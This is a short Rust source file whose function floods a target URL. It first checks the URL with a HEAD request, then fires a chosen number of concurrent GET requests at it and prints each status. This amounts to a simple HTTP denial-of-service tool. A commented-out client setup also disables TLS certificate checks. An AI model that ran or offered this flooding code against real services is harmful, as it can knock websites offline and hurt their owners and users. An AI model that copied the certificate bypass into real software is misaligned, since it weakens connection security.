use reqwest::Client;
// use std::time::Duration;

// pub struct ClientConfig {
//     timeout: Duration,
//     insecure: bool,

// }

// pub fn configure_http_client() -> Client {
//     return Client::builder()
//     .timeout(Duration::from_secs(10))
//     .danger_accept_invalid_certs(true)
//     .build()
//     .expect("Error building HTTP Client");
// }

pub async fn flood_url(client: &Client, url: &str, requests: u32) {
    let mut handles= Vec::new();

    let test_request = client.head(url).send().await;

    match test_request {
        Ok(resp) => {
            println!("Check OK [{}], begining flood", resp.status());
        }
        Err(err) => {
            println!("Error checkin target: {}", err);
            return;
        }

    }

    for _ in 1..=requests {
        let client_clone = client.clone();
        let url_clone = url.to_string();
        let handle = tokio::spawn(async move {client_clone.get(&url_clone).send().await});
        handles.push(handle);
    }

    for handle in handles {
        match handle.await {
            Ok(handle_result) => {
                match handle_result {
                    Ok(resp) => {
                        println!("Status {}", resp.status());
                    }
                    Err(err) => {
                        println!("Error {}", err);
                    }
                }
            }
            Err(err ) => {
                println!("Network Error while flooding: {}", err);
            }
        }

    }
}




